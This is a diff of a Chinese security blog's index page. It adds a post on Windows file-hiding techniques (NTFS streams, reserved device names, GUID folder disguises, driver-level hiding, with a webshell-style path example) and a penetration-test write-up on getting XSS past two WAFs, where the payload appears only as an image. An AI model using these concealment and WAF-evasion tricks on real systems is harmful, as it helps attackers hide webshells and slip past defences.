+      <a class="article-title" href="/2018/08/20/常见windows隐藏文件方式总结/">常见windows隐藏文件方式总结</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/20/常见windows隐藏文件方式总结/" class="archive-article-date">
+  	<time datetime="2018-08-20T02:45:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>由于最近在看一些黑链等资料，对于如何在windows下隐藏文件或者文件目录略感兴趣，于是顺便学习了一下</p>
+<h2 id="0x01-直接隐藏"><a href="#0x01-直接隐藏" class="headerlink" title="0x01 直接隐藏"></a>0x01 直接隐藏</h2><p>直接隐藏，在文件夹的属性隐藏中勾选即可，可以通过打开隐藏文件显示以及显示文件后缀名的方式查看</p>
+<p>将文件简单隐藏</p>
+<p><img src="\img\1534733449065.png" alt="属性隐藏">                                             </p>
+<p>可以看到该文件夹已经被隐藏</p>
+<p>   <img src="\img\1534733491785.png" alt="隐藏效果"></p>
+<p>打开查看隐藏的项目，即可看到被隐藏的文件夹</p>
+<p>   <img src="\img\1534733517165.png" alt="查看隐藏"></p>
+<h2 id="0x02-Zip隐写"><a href="#0x02-Zip隐写" class="headerlink" title="0x02  Zip隐写"></a>0x02  Zip隐写</h2><p>可以将文本压缩成zip格式与图片合成一个图片 看起来仍然是图片，这暗中可以通过将图片改成zip即可,使用copy命令即可，过于简单，就不演示 </p>
+<h2 id="0x03-NTFS流隐写"><a href="#0x03-NTFS流隐写" class="headerlink" title="0x03 NTFS流隐写"></a>0x03 NTFS流隐写</h2><p> 可以通过特殊的构造方式，将信息隐藏，看起来可能是空白，而且属性中也是0kb，但实际上是隐藏起来,只有知道准确的文件路径才能打开</p>
+<p><img src="\img\1534733780826.png" alt="1534733780826"></p>
+<p><img src="\img\1534733814196.png" alt="1534733814196"></p>
+<p><img src="\img\1534733837160.png" alt="1534733837160"></p>
+<p><img src="\img\1534733854129.png" alt="1534733854129"></p>
+<h2 id="0x04-畸形目录"><a href="#0x04-畸形目录" class="headerlink" title="0x04 畸形目录"></a>0x04 畸形目录</h2><p>目录中存在一个或多个.(点，英文句号) 由于windows系统的限制，文件名中不能包含\/:*?等特殊字符</p>
+<p>创建该目录</p>
+<p><img src="\img\1534733889534.png" alt="1534733889534"></p>
+<p>打开的时候无法打开</p>
+<p>   <img src="\img\1534733910906.png" alt="1534733910906"></p>
+<p>可以使用start命令打开或运行中输入完整路径</p>
+<p><img src="\img\1534733925319.png" alt="1534733925319"></p>
+<p>删除rd </p>
+<p>   <img src="\img\1534733941324.png" alt="1534733941324"></p>
+<h2 id="0x05-特殊文件名"><a href="#0x05-特殊文件名" class="headerlink" title="0x05 特殊文件名"></a>0x05 特殊文件名</h2><p>实质上就是系统设备名，是Windows系统保留的文件名，普通方法无法访问，主要有：lpt1-9，aux，com1-9，prn，nul，con，nul, clocks 例如：lpt.txt com1.txt </p>
+<p><img src="\img\1534733985136.png" alt="1534733985136"></p>
+<p>如果目录较复杂，例如C:Inetpub\wwwroot\COM6.KEY_shell.asp</p>
+<p>此时查看时为</p>
+<p>type .C:InetpubwwwrootCOM6.KEY_shell.asp</p>
+<p>如果这种方式无法查看，还可以用dir /x找到真实文件名，然后在运行中输出该完整目录即可</p>
+<p>删除</p>
+<p>del /f /q /a .c:aux.txt</p>
+<h2 id="0x06-GUID-windows-预留隐藏"><a href="#0x06-GUID-windows-预留隐藏" class="headerlink" title="0x06 GUID windows 预留隐藏"></a>0x06 GUID windows 预留隐藏</h2><p>我的电脑: {20D04FE0-3AEA-1069-A2D8-08002B30309D}<br> 回收站: {645FF040-5081-101B-9F08-00AA002F954E}<br> 桌面: {00021400-0000-0000-C000-000000000046}<br> 控制面板: {21EC2020-3AEA-1069-A2DD-08002B30309D}<br> 打印机: {2227A280-3AEA-1069-A2DE-08002B30309D}<br> 拔号网络: {A4D92740-67CD-11CF-96F2-00AA00A11DD9}<br> 字体: {BD84B380-8CA2-1069-AB1D-08000948F534}<br> IE: {871C5380-42A0-1069-A2EA-08002B30309D}<br> Outlook: {00020D75-0000-0000-C000-000000000046}<br> 网络邻居: {208D2C60-3AEA-1069-A2D7-08002B30309D}<br> 历史文件夹: {FF393560-C2A7-11CF-BFF4-444553540000}<br> 公文包: {85BBD920-42A0-1069-A2E4-08002B30309D}<br> 网络缓存文件夹: {7BD29E00-76C1-11CF-9DD0-00A0C9034933}<br> ActiveX缓存文件夹: {88C6C381-2E85-11D0-94DE-444553540000}</p>
+<p>新建文件夹，将上列GUID当作后缀，例如1. {20D04FE0-3AEA-1069-A2D8-08002B30309D}就可以将文件夹隐藏为我的电脑图标</p>
+<p>   <img src="\img\1534734002201.png" alt="1534734002201"></p>
+<h2 id="0x07-驱动级隐藏"><a href="#0x07-驱动级隐藏" class="headerlink" title="0x07   驱动级隐藏"></a>0x07   驱动级隐藏</h2><p>这个是最容易被黑帽们隐藏文件的方式，只有停止某些隐藏的进程才能将隐藏文件显示出来，因此不易发现，只有正确的完整路径可以访问的，但是却找不到在哪里，一般使用Easy File Locker 1.3工具，下载地址：<a href="http://www.xoslab.com/download.html" target="_blank" rel="noopener">http://www.xoslab.com/download.html</a>，简单易用</p>
+<p>最典型的特征就是系统盘及系统目录中存在一下文件</p>
+<p> <img src="\img\1534734022953.png" alt="1534734022953"></p>
+<p><img src="\img\1534734040079.png" alt="1534734040079"></p>
+<p>  实例：访问某seo目录发现有内容，但是在服务器上没有找到该目录</p>
+<p>   <img src="\img\1534734059215.png" alt="1534734059215"></p>
+<p>此驱动级隐藏文件会在服务项启动一个xlfs的服务，配置文档为C:\WINDOWS.xlkfs，内容既是隐藏的文件目录，因此当处理这类隐藏时，一定不要上去就删除隐藏文件，要先根据隐藏文件确定在哪些目录，然后停止服务，就发现了。通过下图我们知道确实是隐藏了seo目录</p>
+<p>   <img src="\img\1534734070449.png" alt="1534734070449"></p>
+<p>查看是否存在该服务项</p>
+<p>   <img src="\img\1534734083464.png" alt="1534734083464"></p>
+<p>将该目录刷新就可以看到有seo目录出现</p>
+<p>   <img src="\img\1534734096727.png" alt="1534734096727"></p>
+<h2 id="0x08-参考文章"><a href="#0x08-参考文章" class="headerlink" title="0x08 参考文章"></a>0x08 参考文章</h2><p><a href="https://thief.one/2017/09/28/1/" target="_blank" rel="noopener">https://thief.one/2017/09/28/1/</a></p>
+<p><a href="http://www.91ri.org/3806.html" target="_blank" rel="noopener">http://www.91ri.org/3806.html</a></p>
+<p><a href="https://blog.csdn.net/bruce135lee/article/details/77519770" target="_blank" rel="noopener">https://blog.csdn.net/bruce135lee/article/details/77519770</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">windows</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/常见windows隐藏文件方式总结/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-绕过双重waf拿到魔改JCMS-WCM的XSS" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/15/绕过双重waf拿到魔改JCMS-WCM的XSS/">绕过双重WAF拿到魔改JCMS+WCM的XSS</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/15/绕过双重waf拿到魔改JCMS-WCM的XSS/" class="archive-article-date">
+  	<time datetime="2018-08-15T12:04:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p> 最近突然一脸懵逼被迫，卖血卖肾做渗透，给了几个域名，打开一看，emmm。。。。,逗我呢，这不就是一个站吗？作为一个只想摸鱼的菜鸡，对于这种问题，当然是想着怎么手撸，不要问我为什么手撸，表示没做过三无网站：“无墙无狗无WAF”。</p>
+<h1 id="0x01-前期信息收集"><a href="#0x01-前期信息收集" class="headerlink" title="0x01 前期信息收集"></a>0x01 前期信息收集</h1><p>作为一个手撸党，当然也不可能纯手撸站，还是需要我们的一些经典工具，只是不能漏扫，不能扫目录这样的，当然慢慢扫也是可以的，前提是你的代理多，要不然分分钟教你做人-论如何花式封IP，推荐一个很好的安全导航~渗透师，直接百度即可，通过一些ping，Zoomeye，fofa，简单测试了下就知道域名直接ping的IP并不是真实IP，应该是用了CDN加速，但是却没有云waf，看来并不是某云waf厂商的盾，后来感觉貌似是某服的产品，难怪封IP的姿势如此熟悉，既然是某服防火墙，那我还是认命吧，一个个功能点看，一定要记得查看所有的源代码，很多时候查看源代码能泄露出很多信息，通过各种查看，发现是大汉JCMS跟拓尔思IDS WCM做的一个综合网站</p>
+<p>大汉JCMS</p>
+<p><img src="\img\jcms.png" alt="大汉jcms"></p>
+<p>拓尔思TRS</p>
+<p><img src="\img\trs.png" alt="TRS"></p>
+<p>安全狗</p>
+<p><img src="\img\safedog.png" alt="安全狗"></p>
+<p>某服防火墙</p>
+<p><img src="\img\af.png" alt="AF"></p>
+<h1 id="0x02-漏洞点"><a href="#0x02-漏洞点" class="headerlink" title="0x02 漏洞点"></a>0x02 漏洞点</h1><p> 手撸党于是在一个个坑中走，当然网上也找到了很多历史版本的漏洞，但是由于该站魔改，目录啥的都不一样，还将大多数有漏洞利用点的接口删除，看来还是个机智的网站，最后自己在体验该网站的各项功能时，发现一个可以信息公开查询的登录，emmm。。。感觉这个貌似并不需要注册登录的那种吧，一般这类网站是没有注册点的，后来果然，发现是自己写一项建议，然后会生成一个长数字串，利用建议的发起人和长数字串就可以登录查询自己所提的建议，这下自己填写的东西就可以回显查看了。</p>
+<p>漏洞点</p>
+<p><img src="\img\1534471969885.png" alt="漏洞点"></p>
+<p>利用方式：建议一开始不要使用什么敏感的标签，碰到变态防火墙很容易直接被封IP，可以只用h1，p，b之类的无害标签，于是拿h1标签测试了一下</p>
+<p><img src="\img\simplehuixian.png" alt="h1回显"></p>
+<p>可以看到名字那里格外的大。。。对，就是格外的大，说明我们的h1标签起作用了，至少一个html到手，也说明对于标签的&lt;&gt;等并没有过滤，只是敏感标签会被防火墙以及狗给拦截，尝试了常用的img , script ,a ，audio，video，svg发现都不太行，但幸好对于on事件拦截的不够，后来神队友上线送了一个payload，至今觉得很牛皮，应该目前没有什么厂商可以拦截到，透漏下是p标签的</p>
+<p><img src="\img\1534471884305.png" alt="xss"></p>
+<p>神payload：</p>
+<p><img src="\img\1534471915139.png" alt="payload"></p>
+<h1 id="0x03后记"><a href="#0x03后记" class="headerlink" title="0x03后记"></a>0x03后记</h1><p>由于给的一批网站都一个模板，后来又找到点信息泄露，勉强完成了整个渗透工作，但是还是觉得很菜，毕竟没有shell的渗透都是假渗透，对于整个过程总结一下，做渗透测试时一定要注意前期信息收集，虽然这个过程会让你比别的小伙伴速度慢点，但是信息搜集好了，在后边做渗透的过程你可能会更容易发现一些不容易看出来的点。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XSS</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/XSS//" class="article-tag-list-link color4">XSS</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/15/绕过双重waf拿到魔改JCMS-WCM的XSS/">展开全文 >></a>
         </p>
       
 
@@ -327,7 +975,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2018 1u0Hun
+    		&copy; 2019 1u0Hun
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -431,15 +1079,11 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Love</a>
+                <a href="javascript:void(0)" class="js-tag color3">UEditor</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">SSRF WEB安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">SSTI注入 web安全</a>
+                <a href="javascript:void(0)" class="js-tag color1">Windows-挖矿</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -455,7 +1099,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">二进制安全</a>
+                <a href="javascript:void(0)" class="js-tag color5">内网渗透 信息收集</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">安卓逆向</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">恶意代码  二进制</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -463,11 +1115,27 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">CTF学习</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">SSTI注入 web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">windows-后门病毒</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">二进制安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">XSS</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF学习</a>
+                <a href="javascript:void(0)" class="js-tag color1">SSRF WEB安全</a>
               </li>
             
             <div class="clearfix"></div>
